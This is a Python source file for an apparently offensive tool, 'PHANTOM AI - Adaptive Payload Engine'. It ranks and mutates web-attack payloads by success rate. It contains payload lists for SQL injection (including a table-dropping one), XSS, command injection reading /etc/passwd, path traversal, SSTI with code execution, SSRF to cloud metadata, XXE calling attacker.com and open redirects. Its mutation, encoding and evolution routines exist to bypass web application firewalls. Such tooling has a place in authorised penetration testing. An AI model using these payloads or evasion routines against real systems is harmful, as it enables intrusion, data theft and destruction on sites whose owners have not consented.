"""
PHANTOM AI - Adaptive Payload Engine

Self-learning payload system that adapts based on success rates,
target behavior, and WAF evasion requirements.

Version: 3.0.0
Date: 2026-01-30
"""

from __future__ import annotations

import hashlib
import json
import random
import re
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import quote


# =============================================================================
# CONSTANTS
# =============================================================================

VERSION = "3.0.0"

# Default learning data directory
DEFAULT_LEARNING_DIR = Path.home() / ".phantom" / "learning"

# Minimum success rate to keep payload in rotation
MIN_SUCCESS_RATE = 0.01  # 1%

# Maximum payload mutations per generation
MAX_MUTATIONS = 10

# Learning rate for payload scoring
LEARNING_RATE = 0.1


# =============================================================================
# ENUMS
# =============================================================================

class PayloadType(Enum):
    """Types of payloads."""
    SQL_INJECTION = "sqli"
    XSS = "xss"
    COMMAND_INJECTION = "cmdi"
    PATH_TRAVERSAL = "path_traversal"
    SSTI = "ssti"
    SSRF = "ssrf"
    XXE = "xxe"
    LDAP_INJECTION = "ldap"
    NOSQL_INJECTION = "nosql"
    CRLF_INJECTION = "crlf"
    HEADER_INJECTION = "header"
    OPEN_REDIRECT = "redirect"
    FILE_UPLOAD = "upload"
    DESERIALIZATION = "deser"


class EncodingType(Enum):
    """Payload encoding types."""
    NONE = "none"
    URL = "url"
    DOUBLE_URL = "double_url"
    HTML = "html"
    UNICODE = "unicode"
    BASE64 = "base64"
    HEX = "hex"
    OCTAL = "octal"
    UTF7 = "utf7"
    UTF8_OVERLONG = "utf8_overlong"
    CASE_VARIATION = "case"
    NULL_BYTE = "null"
    COMMENT = "comment"


class MutationType(Enum):
    """Types of payload mutations."""
    CASE_SWAP = "case_swap"
    WHITESPACE_INSERT = "whitespace"
    COMMENT_INSERT = "comment"
    ENCODING_CHANGE = "encoding"
    KEYWORD_SUBSTITUTE = "keyword_sub"
    PADDING_ADD = "padding"
    FRAGMENT_SPLIT = "fragment"
    CONCAT_OPERATOR = "concat"
    FUNCTION_WRAP = "function"
    UNICODE_ESCAPE = "unicode"


class ContextType(Enum):
    """Injection context types."""
    HTML_ATTRIBUTE = "html_attr"
    HTML_TAG = "html_tag"
    HTML_COMMENT = "html_comment"
    JAVASCRIPT_STRING = "js_string"
    JAVASCRIPT_TEMPLATE = "js_template"
    SQL_STRING = "sql_string"
    SQL_NUMERIC = "sql_numeric"
    SQL_COLUMN = "sql_column"
    URL_PARAMETER = "url_param"
    URL_PATH = "url_path"
    HEADER_VALUE = "header"
    JSON_VALUE = "json"
    XML_VALUE = "xml"
    SHELL_ARGUMENT = "shell_arg"
    FILE_PATH = "file_path"


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class PayloadResult:
    """Result of a payload execution."""
    payload_id: str
    payload: str
    payload_type: PayloadType
    success: bool
    response_code: int
    response_time_ms: float
    detection_indicators: List[str] = field(default_factory=list)
    waf_blocked: bool = False
    error_message: Optional[str] = None
    timestamp: datetime = field(default_factory=datetime.now)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "payload_id": self.payload_id,
            "payload": self.payload,
            "payload_type": self.payload_type.value,
            "success": self.success,
            "response_code": self.response_code,
            "response_time_ms": self.response_time_ms,
            "detection_indicators": self.detection_indicators,
            "waf_blocked": self.waf_blocked,
            "error_message": self.error_message,
            "timestamp": self.timestamp.isoformat(),
        }


@dataclass
class PayloadStats:
    """Statistics for a payload."""
    payload_id: str
    payload: str
    payload_type: PayloadType
    total_attempts: int = 0
    successful_attempts: int = 0
    waf_blocked_attempts: int = 0
    avg_response_time_ms: float = 0.0
    last_success: Optional[datetime] = None
    last_attempt: Optional[datetime] = None
    score: float = 0.5  # Initial neutral score
    mutations: List[str] = field(default_factory=list)
    effective_against: Set[str] = field(default_factory=set)  # WAF names
    ineffective_against: Set[str] = field(default_factory=set)

    @property
    def success_rate(self) -> float:
        """Calculate success rate."""
        if self.total_attempts == 0:
            return 0.0
        return self.successful_attempts / self.total_attempts

    @property
    def waf_block_rate(self) -> float:
        """Calculate WAF block rate."""
        if self.total_attempts == 0:
            return 0.0
        return self.waf_blocked_attempts / self.total_attempts

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "payload_id": self.payload_id,
            "payload": self.payload,
            "payload_type": self.payload_type.value,
            "total_attempts": self.total_attempts,
            "successful_attempts": self.successful_attempts,
            "waf_blocked_attempts": self.waf_blocked_attempts,
            "avg_response_time_ms": self.avg_response_time_ms,
            "last_success": self.last_success.isoformat() if self.last_success else None,
            "last_attempt": self.last_attempt.isoformat() if self.last_attempt else None,
            "score": self.score,
            "success_rate": self.success_rate,
            "waf_block_rate": self.waf_block_rate,
            "mutations": self.mutations,
            "effective_against": list(self.effective_against),
            "ineffective_against": list(self.ineffective_against),
        }

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> "PayloadStats":
        """Create from dictionary."""
        return cls(
            payload_id=data["payload_id"],
            payload=data["payload"],
            payload_type=PayloadType(data["payload_type"]),
            total_attempts=data.get("total_attempts", 0),
            successful_attempts=data.get("successful_attempts", 0),
            waf_blocked_attempts=data.get("waf_blocked_attempts", 0),
            avg_response_time_ms=data.get("avg_response_time_ms", 0.0),
            last_success=datetime.fromisoformat(data["last_success"]) if data.get("last_success") else None,
            last_attempt=datetime.fromisoformat(data["last_attempt"]) if data.get("last_attempt") else None,
            score=data.get("score", 0.5),
            mutations=data.get("mutations", []),
            effective_against=set(data.get("effective_against", [])),
            ineffective_against=set(data.get("ineffective_against", [])),
        )


@dataclass
class AdaptivePayload:
    """Adaptive payload with context and encoding information."""
    payload_id: str
    raw_payload: str
    encoded_payload: str
    payload_type: PayloadType
    encoding: EncodingType
    context: ContextType
    mutations_applied: List[MutationType] = field(default_factory=list)
    score: float = 0.5
    generation: int = 0  # Evolution generation
    parent_id: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "payload_id": self.payload_id,
            "raw_payload": self.raw_payload,
            "encoded_payload": self.encoded_payload,
            "payload_type": self.payload_type.value,
            "encoding": self.encoding.value,
            "context": self.context.value,
            "mutations_applied": [m.value for m in self.mutations_applied],
            "score": self.score,
            "generation": self.generation,
            "parent_id": self.parent_id,
        }


# =============================================================================
# ENCODING FUNCTIONS
# =============================================================================

def encode_payload(payload: str, encoding: EncodingType) -> str:
    """Encode payload using specified encoding."""
    if encoding == EncodingType.NONE:
        return payload

    elif encoding == EncodingType.URL:
        return quote(payload, safe='')

    elif encoding == EncodingType.DOUBLE_URL:
        return quote(quote(payload, safe=''), safe='')

    elif encoding == EncodingType.HTML:
        html_entities = {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;',
            '&': '&amp;',
        }
        for char, entity in html_entities.items():
            payload = payload.replace(char, entity)
        return payload

    elif encoding == EncodingType.UNICODE:
        return ''.join(f'\\u{ord(c):04x}' for c in payload)

    elif encoding == EncodingType.BASE64:
        import base64
        return base64.b64encode(payload.encode()).decode()

    elif encoding == EncodingType.HEX:
        return ''.join(f'%{ord(c):02x}' for c in payload)

    elif encoding == EncodingType.OCTAL:
        return ''.join(f'\\{ord(c):03o}' for c in payload)

    elif encoding == EncodingType.CASE_VARIATION:
        result = []
        for i, c in enumerate(payload):
            if c.isalpha():
                result.append(c.upper() if i % 2 == 0 else c.lower())
            else:
                result.append(c)
        return ''.join(result)

    elif encoding == EncodingType.NULL_BYTE:
        return payload.replace(' ', '%00')

    elif encoding == EncodingType.COMMENT:
        # SQL comment obfuscation
        return payload.replace(' ', '/**/')

    return payload


# =============================================================================
# MUTATION FUNCTIONS
# =============================================================================

class PayloadMutator:
    """Mutates payloads to evade detection."""

    # SQL keyword synonyms
    SQL_SYNONYMS = {
        'SELECT': ['SeLeCt', 'select', '%53%45%4c%45%43%54', '/*!SELECT*/'],
        'UNION': ['UnIoN', 'union', '%55%4e%49%4f%4e', '/*!UNION*/'],
        'AND': ['AnD', 'and', '&&', '%41%4e%44'],
        'OR': ['oR', 'or', '||', '%4f%52'],
        'FROM': ['FrOm', 'from', '%46%52%4f%4d'],
        'WHERE': ['WhErE', 'where', '%57%48%45%52%45'],
    }

    # XSS keyword alternatives
    XSS_ALTERNATIVES = {
        'script': ['ScRiPt', 'SCRIPT', 'scrIpt'],
        'alert': ['Alert', 'ALERT', 'aLeRt', 'confirm', 'prompt'],
        'onerror': ['OnErRoR', 'ONERROR', 'oNeRrOr'],
        'onload': ['OnLoAd', 'ONLOAD'],
    }

    # Whitespace alternatives
    WHITESPACE_ALTERNATIVES = [
        ' ',
        '%09',  # Tab
        '%0a',  # Newline
        '%0d',  # Carriage return
        '%0b',  # Vertical tab
        '%0c',  # Form feed
        '/**/',
        '/*!*/',
        '+',
        '%20',
    ]

    @classmethod
    def mutate(
        cls,
        payload: str,
        mutation_type: MutationType,
        payload_type: PayloadType,
    ) -> str:
        """Apply mutation to payload."""
        if mutation_type == MutationType.CASE_SWAP:
            return cls._case_swap(payload)

        elif mutation_type == MutationType.WHITESPACE_INSERT:
            return cls._whitespace_insert(payload)

        elif mutation_type == MutationType.COMMENT_INSERT:
            return cls._comment_insert(payload, payload_type)

        elif mutation_type == MutationType.KEYWORD_SUBSTITUTE:
            return cls._keyword_substitute(payload, payload_type)

        elif mutation_type == MutationType.PADDING_ADD:
            return cls._padding_add(payload)

        elif mutation_type == MutationType.CONCAT_OPERATOR:
            return cls._concat_operator(payload, payload_type)

        elif mutation_type == MutationType.UNICODE_ESCAPE:
            return cls._unicode_escape(payload)

        return payload

    @classmethod
    def _case_swap(cls, payload: str) -> str:
        """Randomly swap case of alphabetic characters."""
        result = []
        for c in payload:
            if c.isalpha():
                result.append(c.upper() if random.random() > 0.5 else c.lower())
            else:
                result.append(c)
        return ''.join(result)

    @classmethod
    def _whitespace_insert(cls, payload: str) -> str:
        """Replace spaces with alternative whitespace."""
        ws = random.choice(cls.WHITESPACE_ALTERNATIVES)
        return payload.replace(' ', ws)

    @classmethod
    def _comment_insert(cls, payload: str, payload_type: PayloadType) -> str:
        """Insert comments to break up patterns."""
        if payload_type in [PayloadType.SQL_INJECTION, PayloadType.NOSQL_INJECTION]:
            # SQL-style comments
            words = payload.split()
            return '/**/'.join(words)
        elif payload_type == PayloadType.XSS:
            # HTML comments
            return payload.replace('>', '><!---->').replace('<', '<!----><')
        return payload

    @classmethod
    def _keyword_substitute(cls, payload: str, payload_type: PayloadType) -> str:
        """Substitute keywords with alternatives."""
        if payload_type == PayloadType.SQL_INJECTION:
            for keyword, alts in cls.SQL_SYNONYMS.items():
                if keyword in payload.upper():
                    alt = random.choice(alts)
                    payload = re.sub(keyword, alt, payload, flags=re.IGNORECASE)
        elif payload_type == PayloadType.XSS:
            for keyword, alts in cls.XSS_ALTERNATIVES.items():
                if keyword in payload.lower():
                    alt = random.choice(alts)
                    payload = re.sub(keyword, alt, payload, flags=re.IGNORECASE)
        return payload

    @classmethod
    def _padding_add(cls, payload: str) -> str:
        """Add padding to payload."""
        padding_chars = ['\t', '\n', '\r', ' ', '/**/']
        prefix = random.choice(padding_chars) * random.randint(1, 3)
        suffix = random.choice(padding_chars) * random.randint(1, 3)
        return prefix + payload + suffix

    @classmethod
    def _concat_operator(cls, payload: str, payload_type: PayloadType) -> str:
        """Use concatenation to split strings."""
        if payload_type == PayloadType.SQL_INJECTION:
            # SQL string concatenation
            if "'" in payload:
                return payload.replace("'", "'||'")
        elif payload_type == PayloadType.XSS:
            # JavaScript string concatenation
            if '"' in payload:
                parts = payload.split('"')
                return '"+'.join(parts)
        return payload

    @classmethod
    def _unicode_escape(cls, payload: str) -> str:
        """Escape characters using unicode."""
        result = []
        for c in payload:
            if c.isalpha() and random.random() > 0.7:
                result.append(f'\\u{ord(c):04x}')
            else:
                result.append(c)
        return ''.join(result)


# =============================================================================
# ADAPTIVE PAYLOAD ENGINE
# =============================================================================

class AdaptivePayloadEngine:
    """
    Self-learning payload engine that adapts based on success rates
    and target behavior.
    """

    VERSION = "3.0.0"

    # Base payloads for each type
    BASE_PAYLOADS = {
        PayloadType.SQL_INJECTION: [
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR \"\"=\"",
            "' OR 1=1#",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "1' ORDER BY 1--",
            "') OR ('1'='1",
            "'; DROP TABLE users--",
            "' AND SUBSTRING(username,1,1)='a",
            "1 AND 1=1",
            "1' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "1' AND benchmark(10000000,SHA1('test'))--",
        ],
        PayloadType.XSS: [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert(1)>",
            "'-alert(1)-'",
            "\"><script>alert(1)</script>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<iframe srcdoc=\"<script>alert(1)</script>\">",
            "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        ],
        PayloadType.COMMAND_INJECTION: [
            "; ls -la",
            "| cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; id",
            "| id",
            "& id",
            "&& id",
            "|| id",
            "; sleep 5",
            "| sleep 5",
            "${IFS}id",
            ";$IFS'id'",
            "{{7*7}}",
        ],
        PayloadType.PATH_TRAVERSAL: [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "/etc/passwd%00.png",
            "file:///etc/passwd",
            "....\\....\\....\\etc\\passwd",
        ],
        PayloadType.SSTI: [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "*{7*7}",
            "@(7*7)",
            "{{config}}",
            "{{self}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
        ],
        PayloadType.SSRF: [
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://0.0.0.0",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:6379/_",
            "dict://127.0.0.1:6379/info",
            "http://127.1",
            "http://0",
            "http://2130706433",  # Decimal for 127.0.0.1
        ],
        PayloadType.XXE: [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>',
        ],
        PayloadType.LDAP_INJECTION: [
            "*)(&",
            "*)(objectClass=*",
            "admin)(&",
            "*()|&'",
            "*)(uid=*))(|(uid=*",
        ],
        PayloadType.NOSQL_INJECTION: [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
            "true, $where: '1 == 1'",
            '"; return true; var foo="',
            "' || '1'=='1",
        ],
        PayloadType.CRLF_INJECTION: [
            "%0d%0aSet-Cookie: evil=value",
            "\r\nHeader-Injection: true",
            "%0aX-Injected: true",
            "\nX-Injected: true",
        ],
        PayloadType.OPEN_REDIRECT: [
            "//evil.com",
            "https://evil.com",
            "/\\evil.com",
            "///evil.com",
            "////evil.com",
            "@evil.com",
            "https:evil.com",
        ],
    }

    def __init__(
        self,
        learning_dir: Optional[Path] = None,
        learning_rate: float = LEARNING_RATE,
    ):
        """Initialize the adaptive payload engine."""
        self.learning_dir = learning_dir or DEFAULT_LEARNING_DIR
        self.learning_dir.mkdir(parents=True, exist_ok=True)

        self.learning_rate = learning_rate

        # Payload statistics storage
        self.payload_stats: Dict[str, PayloadStats] = {}

        # Context-specific payload rankings
        self.context_rankings: Dict[Tuple[PayloadType, ContextType], List[str]] = {}

        # WAF-specific effective payloads
        self.waf_effective: Dict[str, List[str]] = {}

        # Load learned data
        self._load_learned_data()

    # =========================================================================
    # PUBLIC METHODS
    # =========================================================================

    def get_payloads(
        self,
        payload_type: PayloadType,
        context: ContextType = ContextType.URL_PARAMETER,
        waf_name: Optional[str] = None,
        limit: int = 20,
        include_mutations: bool = True,
    ) -> List[AdaptivePayload]:
        """
        Get ranked payloads for a specific type and context.

        Args:
            payload_type: Type of vulnerability to target
            context: Injection context
            waf_name: Known WAF name to avoid blocked payloads
            limit: Maximum number of payloads to return
            include_mutations: Whether to include mutated variants

        Returns:
            List of AdaptivePayload objects ranked by effectiveness
        """
        payloads = []

        # Get base payloads
        base_payloads = self.BASE_PAYLOADS.get(payload_type, [])

        for raw_payload in base_payloads:
            payload_id = self._generate_payload_id(raw_payload, payload_type)

            # Get payload statistics
            stats = self.payload_stats.get(payload_id)
            score = stats.score if stats else 0.5

            # Adjust score based on WAF
            if waf_name and stats:
                if waf_name in stats.effective_against:
                    score += 0.2
                elif waf_name in stats.ineffective_against:
                    score -= 0.3

            # Determine best encoding for context
            encoding = self._get_best_encoding(context, payload_type)

            # Encode payload
            encoded = encode_payload(raw_payload, encoding)

            adaptive_payload = AdaptivePayload(
                payload_id=payload_id,
                raw_payload=raw_payload,
                encoded_payload=encoded,
                payload_type=payload_type,
                encoding=encoding,
                context=context,
                score=score,
            )

            payloads.append(adaptive_payload)

            # Generate mutations if requested
            if include_mutations:
                mutations = self._generate_mutations(
                    raw_payload, payload_type, context, score
                )
                payloads.extend(mutations)

        # Sort by score (highest first)
        payloads.sort(key=lambda p: p.score, reverse=True)

        return payloads[:limit]

    def record_result(self, result: PayloadResult) -> None:
        """
        Record the result of a payload execution.

        This updates the learning data to improve future payload selection.
        """
        payload_id = result.payload_id

        # Get or create stats
        if payload_id not in self.payload_stats:
            self.payload_stats[payload_id] = PayloadStats(
                payload_id=payload_id,
                payload=result.payload,
                payload_type=result.payload_type,
            )

        stats = self.payload_stats[payload_id]

        # Update attempt counts
        stats.total_attempts += 1
        stats.last_attempt = result.timestamp

        if result.success:
            stats.successful_attempts += 1
            stats.last_success = result.timestamp

            # Increase score for successful payloads
            stats.score = min(1.0, stats.score + self.learning_rate)

        else:
            # Decrease score for failed payloads
            stats.score = max(0.0, stats.score - self.learning_rate * 0.5)

        if result.waf_blocked:
            stats.waf_blocked_attempts += 1
            # Significantly decrease score for WAF-blocked payloads
            stats.score = max(0.0, stats.score - self.learning_rate * 2)

        # Update average response time
        if stats.total_attempts == 1:
            stats.avg_response_time_ms = result.response_time_ms
        else:
            stats.avg_response_time_ms = (
                stats.avg_response_time_ms * (stats.total_attempts - 1) +
                result.response_time_ms
            ) / stats.total_attempts

        # Save learning data periodically
        if stats.total_attempts % 10 == 0:
            self._save_learned_data()

    def record_waf_effectiveness(
        self,
        payload_id: str,
        waf_name: str,
        effective: bool,
    ) -> None:
        """Record whether a payload is effective against a specific WAF."""
        if payload_id in self.payload_stats:
            stats = self.payload_stats[payload_id]

            if effective:
                stats.effective_against.add(waf_name)
                stats.ineffective_against.discard(waf_name)
            else:
                stats.ineffective_against.add(waf_name)
                stats.effective_against.discard(waf_name)

            # Update WAF-specific rankings
            if waf_name not in self.waf_effective:
                self.waf_effective[waf_name] = []

            if effective and payload_id not in self.waf_effective[waf_name]:
                self.waf_effective[waf_name].append(payload_id)

    def get_waf_bypass_payloads(
        self,
        payload_type: PayloadType,
        waf_name: str,
        limit: int = 10,
    ) -> List[AdaptivePayload]:
        """Get payloads known to bypass a specific WAF."""
        effective_ids = self.waf_effective.get(waf_name, [])
        payloads = []

        for payload_id in effective_ids:
            if payload_id in self.payload_stats:
                stats = self.payload_stats[payload_id]
                if stats.payload_type == payload_type:
                    # Use double encoding for WAF bypass
                    encoding = EncodingType.DOUBLE_URL

                    payloads.append(AdaptivePayload(
                        payload_id=payload_id,
                        raw_payload=stats.payload,
                        encoded_payload=encode_payload(stats.payload, encoding),
                        payload_type=payload_type,
                        encoding=encoding,
                        context=ContextType.URL_PARAMETER,
                        score=stats.score,
                    ))

        payloads.sort(key=lambda p: p.score, reverse=True)
        return payloads[:limit]

    def evolve_payloads(
        self,
        payload_type: PayloadType,
        generations: int = 3,
    ) -> List[AdaptivePayload]:
        """
        Evolve payloads through mutation to discover new effective variants.

        This implements a simple genetic algorithm to discover new payloads.
        """
        evolved = []

        # Get best performing payloads as parents
        parent_payloads = self._get_top_payloads(payload_type, limit=5)

        for generation in range(generations):
            for parent in parent_payloads:
                # Apply random mutations
                mutation_types = random.sample(
                    list(MutationType),
                    k=min(3, len(MutationType))
                )

                mutated_payload = parent.raw_payload
                mutations_applied = []

                for mutation_type in mutation_types:
                    mutated_payload = PayloadMutator.mutate(
                        mutated_payload, mutation_type, payload_type
                    )
                    mutations_applied.append(mutation_type)

                # Create evolved payload
                evolved_id = self._generate_payload_id(
                    mutated_payload, payload_type, f"gen{generation}"
                )

                evolved_payload = AdaptivePayload(
                    payload_id=evolved_id,
                    raw_payload=mutated_payload,
                    encoded_payload=encode_payload(mutated_payload, EncodingType.URL),
                    payload_type=payload_type,
                    encoding=EncodingType.URL,
                    context=ContextType.URL_PARAMETER,
                    mutations_applied=mutations_applied,
                    score=parent.score * 0.9,  # Start slightly lower than parent
                    generation=generation + 1,
                    parent_id=parent.payload_id,
                )

                evolved.append(evolved_payload)

        return evolved

    def get_statistics(self) -> Dict[str, Any]:
        """Get engine statistics."""
        total_payloads = len(self.payload_stats)
        successful_payloads = len([
            s for s in self.payload_stats.values()
            if s.success_rate > MIN_SUCCESS_RATE
        ])
        waf_effective_count = sum(
            len(ids) for ids in self.waf_effective.values()
        )

        return {
            "total_payloads_tracked": total_payloads,
            "successful_payloads": successful_payloads,
            "waf_effective_payloads": waf_effective_count,
            "wafs_tracked": list(self.waf_effective.keys()),
            "total_attempts": sum(
                s.total_attempts for s in self.payload_stats.values()
            ),
            "total_successes": sum(
                s.successful_attempts for s in self.payload_stats.values()
            ),
        }

    def export_learned_data(self, output_path: Path) -> None:
        """Export learned data for backup or sharing."""
        data = {
            "version": VERSION,
            "exported_at": datetime.now().isoformat(),
            "payload_stats": {
                pid: stats.to_dict()
                for pid, stats in self.payload_stats.items()
            },
            "waf_effective": self.waf_effective,
        }
        output_path.write_text(json.dumps(data, indent=2))

    def import_learned_data(self, input_path: Path) -> None:
        """Import learned data from backup."""
        data = json.loads(input_path.read_text())

        for pid, stats_dict in data.get("payload_stats", {}).items():
            self.payload_stats[pid] = PayloadStats.from_dict(stats_dict)

        self.waf_effective = data.get("waf_effective", {})
        self._save_learned_data()

    # =========================================================================
    # PRIVATE METHODS
    # =========================================================================

    def _generate_payload_id(
        self,
        payload: str,
        payload_type: PayloadType,
        suffix: str = "",
    ) -> str:
        """Generate unique payload ID."""
        hash_input = f"{payload_type.value}:{payload}:{suffix}"
        return hashlib.md5(hash_input.encode()).hexdigest()[:16]

    def _get_best_encoding(
        self,
        context: ContextType,
        payload_type: PayloadType,
    ) -> EncodingType:
        """Determine the best encoding for a given context."""
        encoding_map = {
            ContextType.URL_PARAMETER: EncodingType.URL,
            ContextType.URL_PATH: EncodingType.URL,
            ContextType.HTML_ATTRIBUTE: EncodingType.HTML,
            ContextType.JAVASCRIPT_STRING: EncodingType.UNICODE,
            ContextType.JSON_VALUE: EncodingType.UNICODE,
            ContextType.XML_VALUE: EncodingType.HTML,
            ContextType.HEADER_VALUE: EncodingType.NONE,
            ContextType.SHELL_ARGUMENT: EncodingType.NONE,
        }

        return encoding_map.get(context, EncodingType.URL)

    def _generate_mutations(
        self,
        base_payload: str,
        payload_type: PayloadType,
        context: ContextType,
        base_score: float,
    ) -> List[AdaptivePayload]:
        """Generate mutated variants of a payload."""
        mutations = []
        mutation_types = [
            MutationType.CASE_SWAP,
            MutationType.WHITESPACE_INSERT,
            MutationType.COMMENT_INSERT,
            MutationType.KEYWORD_SUBSTITUTE,
        ]

        for mutation_type in mutation_types:
            mutated = PayloadMutator.mutate(
                base_payload, mutation_type, payload_type
            )

            if mutated != base_payload:
                encoding = self._get_best_encoding(context, payload_type)
                payload_id = self._generate_payload_id(
                    mutated, payload_type, mutation_type.value
                )

                mutations.append(AdaptivePayload(
                    payload_id=payload_id,
                    raw_payload=mutated,
                    encoded_payload=encode_payload(mutated, encoding),
                    payload_type=payload_type,
                    encoding=encoding,
                    context=context,
                    mutations_applied=[mutation_type],
                    score=base_score * 0.95,  # Slightly lower than original
                ))

        return mutations[:MAX_MUTATIONS]

    def _get_top_payloads(
        self,
        payload_type: PayloadType,
        limit: int = 5,
    ) -> List[AdaptivePayload]:
        """Get top performing payloads for a type."""
        # Filter by type and sort by score
        typed_stats = [
            stats for stats in self.payload_stats.values()
            if stats.payload_type == payload_type
        ]
        typed_stats.sort(key=lambda s: s.score, reverse=True)

        payloads = []
        for stats in typed_stats[:limit]:
            payloads.append(AdaptivePayload(
                payload_id=stats.payload_id,
                raw_payload=stats.payload,
                encoded_payload=encode_payload(stats.payload, EncodingType.URL),
                payload_type=payload_type,
                encoding=EncodingType.URL,
                context=ContextType.URL_PARAMETER,
                score=stats.score,
            ))

        # Fill with base payloads if not enough learned
        if len(payloads) < limit:
            for payload in self.BASE_PAYLOADS.get(payload_type, [])[:limit - len(payloads)]:
                payload_id = self._generate_payload_id(payload, payload_type)
                payloads.append(AdaptivePayload(
                    payload_id=payload_id,
                    raw_payload=payload,
                    encoded_payload=encode_payload(payload, EncodingType.URL),
                    payload_type=payload_type,
                    encoding=EncodingType.URL,
                    context=ContextType.URL_PARAMETER,
                    score=0.5,
                ))

        return payloads

    def _load_learned_data(self) -> None:
        """Load learned data from disk."""
        data_file = self.learning_dir / "adaptive_learning.json"

        if not data_file.exists():
            return

        try:
            data = json.loads(data_file.read_text())

            for pid, stats_dict in data.get("payload_stats", {}).items():
                self.payload_stats[pid] = PayloadStats.from_dict(stats_dict)

            self.waf_effective = data.get("waf_effective", {})

        except (json.JSONDecodeError, OSError, KeyError, TypeError) as e:
            # Failed to load, start fresh
            logger.debug(f"Failed to load learned payload data: {e}")

    def _save_learned_data(self) -> None:
        """Save learned data to disk."""
        data_file = self.learning_dir / "adaptive_learning.json"

        data = {
            "version": VERSION,
            "saved_at": datetime.now().isoformat(),
            "payload_stats": {
                pid: stats.to_dict()
                for pid, stats in self.payload_stats.items()
            },
            "waf_effective": self.waf_effective,
        }

        data_file.write_text(json.dumps(data, indent=2))


# =============================================================================
# SINGLETON INSTANCE
# =============================================================================

_adaptive_engine: Optional[AdaptivePayloadEngine] = None


def get_adaptive_engine() -> AdaptivePayloadEngine:
    """Get the global adaptive payload engine instance."""
    global _adaptive_engine
    if _adaptive_engine is None:
        _adaptive_engine = AdaptivePayloadEngine()
    return _adaptive_engine


def get_adaptive_payloads(
    payload_type: PayloadType,
    context: ContextType = ContextType.URL_PARAMETER,
    waf_name: Optional[str] = None,
    limit: int = 20,
) -> List[AdaptivePayload]:
    """Get adaptive payloads for a vulnerability type."""
    engine = get_adaptive_engine()
    return engine.get_payloads(
        payload_type=payload_type,
        context=context,
        waf_name=waf_name,
        limit=limit,
    )


def record_payload_result(result: PayloadResult) -> None:
    """Record payload execution result for learning."""
    engine = get_adaptive_engine()
    engine.record_result(result)


# =============================================================================
# PUBLIC API
# =============================================================================

__all__ = [
    # Version
    "VERSION",
    # Enums
    "PayloadType",
    "EncodingType",
    "MutationType",
    "ContextType",
    # Data classes
    "PayloadResult",
    "PayloadStats",
    "AdaptivePayload",
    # Classes
    "AdaptivePayloadEngine",
    "PayloadMutator",
    # Functions
    "encode_payload",
    "get_adaptive_engine",
    "get_adaptive_payloads",
    "record_payload_result",
]
